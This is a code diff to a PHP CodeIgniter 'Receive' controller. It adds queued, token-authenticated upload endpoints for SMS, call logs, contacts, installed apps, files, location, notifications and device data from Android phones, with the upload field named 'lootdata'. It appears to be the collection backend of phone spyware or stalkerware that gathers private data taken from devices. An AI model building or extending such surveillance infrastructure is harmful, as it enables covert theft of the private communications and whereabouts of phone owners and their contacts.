@@ -10,6 +10,7 @@ use App\Models\Mod_Android;
 use App\Models\Mod_Crypt;
 use App\Models\Mod_User;
 use App\Models\Mod_Uploaded_Files;
+use App\Models\Mod_Upload_Queue;
 use App\Models\Mod_Log_User_Action;
 use CodeIgniter\API\ResponseTrait;
 use CodeIgniter\Model;
@@ -48,6 +49,8 @@ class Receive extends BaseController
         'cell_towers', 'display_info', 'storage', 'thermal', 'nfc', 'data_usage', 'saved_wifi', 'default_apps', 'alarms',
         // Group 1-6 new extractors
         'hardware_graphics', 'hardware_network', 'app_security', 'network_security', 'telephony_network', 'system_locale',
+        // Composite extractors
+        'misc_software', 'misc_hardware', 'apps_notifications',
     ];
 
 
@@ -114,8 +117,21 @@ class Receive extends BaseController
         // 9. Save file attributes to NEW database table via model
         $fileRecordId = $this->saveFileViaModel($token, $owner, $fileInfo);
 
-        // 10. Process file based on category
-        $result = $this->processUploadedFile($newName, $owner, $fileInfo['category'], $fileRecordId);
+        // 10. Enqueue file for async processing instead of processing inline
+        $queueModel = new Mod_Upload_Queue();
+        $queueId = $queueModel->enqueue([
+            'stored_filename'   => $newName,
+            'original_filename' => $fileInfo['original_name'],
+            'file_category'     => $fileInfo['category'],
+            'file_size_bytes'   => $fileInfo['size'],
+            'file_record_id'    => $fileRecordId,
+            'owner_id'          => $owner,
+            'device_checksum'   => $this->request->getPost('device_print_id') ?? '',
+            'device_print_id'   => $this->request->getPost('device_print_id') ?? '',
+            'token_used'        => $token,
+            'upload_path'       => $this->uploadConfig['upload_path'] . $newName,
+            'upload_source'     => $this->request->getPost('upload_source') ?? 'auto_sync',
+        ]);
 
         $uploadCategory = $fileInfo['category'];
         $uploadActionType = 'upload_' . $uploadCategory;
@@ -126,43 +142,166 @@ class Receive extends BaseController
             'action_type'     => $uploadActionType,
             'action_severity' => 'low',
             'device_type'     => 'mobile',
-            'success'         => ($result && $result['success']) ? 1 : 0,
+            'success'         => $queueId !== null ? 1 : 0,
             'request_url'     => current_url(),
             'resource_id'     => $fileRecordId,
             'new_values'      => json_encode([
                 'filename' => $fileInfo['original_name'],
                 'size'     => $fileInfo['size'],
                 'category' => $uploadCategory,
+                'queue_id' => $queueId,
             ]),
-            'error_message'   => ($result && $result['success']) ? '' : (is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed'),
+            'error_message'   => $queueId !== null ? '' : 'Failed to enqueue upload',
             'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
         ]);
 
-        if ($result && $result['success']) {
-            // Update file record status via model
-            if ($fileRecordId > 0) {
-                $this->updateFileStatusViaModel($fileRecordId, 'processed', $result);
-            }
+        // Trigger queue processing in background after successful enqueue
+        if ($queueId !== null) {
+            $this->triggerQueueProcessing();
+        }
 
+        if ($queueId !== null) {
             return $this->respondCreated([
-                'status' => 'success',
-                'message' => 'File uploaded and processed successfully',
+                'status' => 'queued',
+                'message' => 'File uploaded and queued for processing',
                 'file_id' => $newName,
-//                'file_record_id' => $fileRecordId > 0 ? $fileRecordId : null,
                 'file_record_id' => null,
+                'queue_id' => $queueId,
                 'category' => $fileInfo['category'],
                 'timestamp' => (string) (time() * 1000)
             ]);
         } else {
-            // Update file record status via model
             if ($fileRecordId > 0) {
-                $errorMsg = is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed';
-                $this->updateFileStatusViaModel($fileRecordId, 'failed', ['error' => $errorMsg]);
+                $this->updateFileStatusViaModel($fileRecordId, 'failed', ['error' => 'Failed to enqueue upload']);
             }
 
-            $errorMessage = is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed';
-            return $this->fail('Failed to process uploaded file: ' . $errorMessage);
+            return $this->fail('Failed to enqueue uploaded file for processing');
         }
+    }
+
+    /**
+     * Individual data upload endpoints - each delegates to the generic upload logic
+     * with a predetermined category.
+     */
+    public function upload_sms()
+    {
+        return $this->uploadWithCategory('sms');
+    }
+
+    public function upload_calls()
+    {
+        return $this->uploadWithCategory('calls');
+    }
+
+    public function upload_contacts()
+    {
+        return $this->uploadWithCategory('contacts');
+    }
+
+    public function upload_apps()
+    {
+        return $this->uploadWithCategory('apps');
+    }
+
+    public function upload_files()
+    {
+        return $this->uploadWithCategory('files');
+    }
+
+    public function upload_location()
+    {
+        return $this->uploadWithCategory('location');
+    }
+
+    public function upload_misc_software()
+    {
+        return $this->uploadWithCategory('misc_software');
+    }
+
+    public function upload_misc_hardware()
+    {
+        return $this->uploadWithCategory('misc_hardware');
+    }
+
+    private function uploadWithCategory(string $category)
+    {
+        if (!$this->request->is('post')) {
+            return $this->fail('Method not allowed', 405);
+        }
+
+        $token = $this->request->getPost('token');
+        if (!$this->validateToken($token)) {
+            return $this->failUnauthorized('Invalid or expired token');
+        }
+
+        $file = $this->request->getFile('lootdata');
+        if (!$file || !$file->isValid()) {
+            return $this->fail($file ? $file->getErrorString() : 'No file uploaded');
+        }
+
+        if (!$this->validateFile($file)) {
+            return $this->fail('Invalid file type or size');
+        }
+
+        $originalName = $file->getClientName();
+        $newName = $file->getRandomName();
+
+        if (!$file->hasMoved()) {
+            try {
+                $file->move($this->uploadConfig['upload_path'], $newName);
+            } catch (\Exception $e) {
+                log_message('error', 'File move failed: ' . $e->getMessage());
+                return $this->fail('Failed to save file');
+            }
+        }
+
+        $owner = $this->getTokenOwner($token);
+        if (!$owner) {
+            @unlink($this->uploadConfig['upload_path'] . $newName);
+            return $this->fail('Invalid token owner');
+        }
+
+        $fileInfo = [
+            'original_name' => $originalName,
+            'new_name'      => $newName,
+            'size'          => $file->getSize(),
+            'extension'     => $file->getExtension(),
+            'mime_type'     => $file->getMimeType(),
+            'category'      => $category,
+            'upload_path'   => $this->uploadConfig['upload_path'] . $newName,
+        ];
+
+        $fileRecordId = $this->saveFileViaModel($token, $owner, $fileInfo);
+
+        $queueModel = new Mod_Upload_Queue();
+        $queueId = $queueModel->enqueue([
+            'stored_filename'   => $newName,
+            'original_filename' => $originalName,
+            'file_category'     => $category,
+            'file_size_bytes'   => $fileInfo['size'],
+            'file_record_id'    => $fileRecordId,
+            'owner_id'          => $owner,
+            'device_checksum'   => $this->request->getPost('device_print_id') ?? '',
+            'device_print_id'   => $this->request->getPost('device_print_id') ?? '',
+            'token_used'        => $token,
+            'upload_path'       => $fileInfo['upload_path'],
+            'upload_source'     => $this->request->getPost('upload_source') ?? 'auto_sync',
+        ]);
+
+        if ($queueId !== null) {
+            $this->triggerQueueProcessing();
+            return $this->respondCreated([
+                'status' => 'queued',
+                'message' => 'File uploaded and queued for processing',
+                'file_id' => $newName,
+                'file_record_id' => null,
+                'queue_id' => $queueId,
+                'category' => $category,
+                'timestamp' => (string) (time() * 1000)
+            ]);
+        }
+
+        return $this->fail('Failed to enqueue uploaded file for processing');
     }
 
     /**
@@ -561,6 +700,10 @@ class Receive extends BaseController
             'network_security'   => 'parse_network_security',
             'telephony_network'  => 'parse_telephony_network',
             'system_locale'      => 'parse_system_locale',
+            // Composite extractors
+            'misc_software'      => 'parse_misc_software',
+            'misc_hardware'      => 'parse_misc_hardware',
+            'apps_notifications' => 'parse_apps_notifications',
         ];
 
         try {
@@ -699,5 +842,21 @@ class Receive extends BaseController
             'message' => $message,
             'errors' => [$message]
         ], 422);
+    }
+
+    /**
+     * Trigger queue processing in background after successful upload.
+     * Runs php spark queue:process asynchronously so it doesn't block the upload response.
+     */
+    private function triggerQueueProcessing(): void
+    {
+        $sparkPath = FCPATH . 'spark';
+        if (!is_file($sparkPath)) {
+            log_message('warning', 'triggerQueueProcessing: spark not found at ' . $sparkPath);
+            return;
+        }
+        $cmd = "nohup php {$sparkPath} queue:process 5 > " . WRITEPATH . "logs/queue_auto.log 2>&1 &";
+        exec($cmd, $output, $returnVar);
+        log_message('info', "triggerQueueProcessing: background queue:process triggered (return={$returnVar})");
     }
 }
